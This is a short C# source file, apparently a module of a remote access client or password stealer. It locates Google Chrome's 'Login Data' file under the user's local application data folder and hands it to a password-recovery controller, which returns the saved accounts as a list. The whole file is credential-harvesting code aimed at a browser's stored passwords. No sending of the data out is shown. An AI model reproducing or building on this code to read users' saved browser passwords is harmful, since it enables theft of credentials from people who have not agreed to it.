using Client.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Client.Controllers.Browsers
{
    class Chrome
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Login Data");
                return PasswordRecoveryController.Passwords(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }        
    }
}
